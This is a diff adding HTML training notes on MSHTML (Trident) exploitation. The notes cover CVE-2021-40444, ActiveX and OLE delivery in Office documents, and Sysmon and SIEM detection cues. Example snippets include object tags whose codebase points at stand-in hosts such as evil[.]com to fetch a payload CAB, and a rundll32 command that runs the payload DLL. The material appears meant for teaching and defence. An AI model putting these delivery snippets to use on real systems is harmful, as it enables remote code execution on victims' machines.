@@ -1,0 +1,28 @@
+<div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
+<h6 class="text-warning mb-3"><i class="bi bi-book me-2"></i>Elaborated Notes with Examples</h6>
+
+<h6 class="text-warning mt-3">1. Trident Engine Overview</h3>
+<p>MSHTML (Trident) is the legacy HTML rendering engine in Internet Explorer and the WebBrowser control in Windows. Despite IE being deprecated, MSHTML is still widely used by Office applications (Word, Excel) and other apps via the WebOC control (<code>mshtml.dll</code>). This creates a large attack surface for weaponized documents and web-based exploits.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Example:</b> An attacker crafts a malicious Microsoft Word document that uses the <code>Microsoft Web Browser</code> control to render an HTML page containing exploit code. The document opens an embedded <code>HTML/ActiveX</code> control targeting <code>mshtml.dll</code>. The exploit bypasses the <code>Protected View</code> in Word because the document is opened from a trusted source or the user clicked "Enable Editing."
+</div>
+
+<h6 class="text-warning mt-3">2. CVE-2021-40444 Deep Dive</h3>
+<p>CVE-2021-40444 is a critical RCE vulnerability in MSHTML. The exploit uses a malicious ActiveX control loaded via a crafted Office document. The attacker embeds an HTML file with an <code>&lt;object&gt;</code> tag pointing to a CAB file hosted on a remote server. When the document previews or renders the HTML, MSHTML downloads and executes the CAB payload.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Example CVE-2021-40444 Attack:</b> The attacker sends an email with a Word document (<code>Q3_Report.docx</code>). Inside the document's <code>oleObject2.xml</code> relationships file, an <code>oleObject</code> references <code>word\_rels\document.xml.rels</code> pointing to an external <code>http://evil[.]com/exploit.html</code>. The HTML contains: <code>&lt;object codebase="http://evil[.]com/payload.cab" classid="clsid:..."&gt;&lt;/object&gt;</code>. When opened in Word, MSHTML downloads the CAB file and extracts a DLL. The DLL is loaded via <code>InfSoft.dll</code> or <code>Setup.exe</code> from the CAB, giving the attacker RCE.
+</div>
+
+<h6 class="text-warning mt-3">3. Office Document Exploitation</h3>
+<p>Office documents can host MSHTML exploits via: OLE objects embedding HTML files, ActiveX controls with remote codebases, VBA userforms with WebBrowser controls, and RTF's <code>objdata</code> with embedded <code>Equation Native</code> streams (CVE-2017-11882).</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Example:</b> A <code>.docx</code> file contains an embedded <code>Web Archive (.mht)</code> file as an OLE object. Extracting with <code>olevba</code> or viewing the <code>[Content_Types].xml</code> reveals <code>&lt;Override PartName="/word/embeddings/exploit.mht" ContentType="message/rfc822"/&gt;</code>. The <code>.mht</code> file contains: <code>&lt;object id="exploit" classid="CLSID:..." codebase="http://evil/payload.cab"&gt;&lt;/object&gt;</code>. The user sees "This document contains ActiveX controls..." and if they click "Enable Content," the exploit fires.
+</div>
+
+<h6 class="text-warning mt-3">4. Detection in Logs</h3>
+<p>MSHTML exploitation detection: Sysmon Event 1 <code>winword.exe -> mshta.exe</code>, Sysmon Event 11 <code>.cab/.dll created in %TEMP%</code>, Sysmon Event 7 (Image loaded — <code>mshtml.dll</code> loaded by Office), network connections from Office processes to external HTTP servers (CAB download), and <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap</code> changes.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Example Detection:</b> SIEM alert: <code>winword.exe (PID 6244) made an HTTP connection to 185.130.5.201:80 GET /payload.cab</code>. Sysmon Event 1 shows <code>winword.exe</code> spawned <code>rundll32.exe</code> with <code>shell32.dll,Control_RunDLL payload.dll</code>. Sysmon Event 11 shows <code>%TEMP%\cab{random}.dll</code> created. Event 7 shows <code>mshtml.dll</code> loaded into <code>winword.exe</code> before the network request. The analyst correlates: Office + MSHTML + CAB download + DLL execution = CVE-2021-40444 compromise. Escalate immediately.
+</div>
+
+</div>
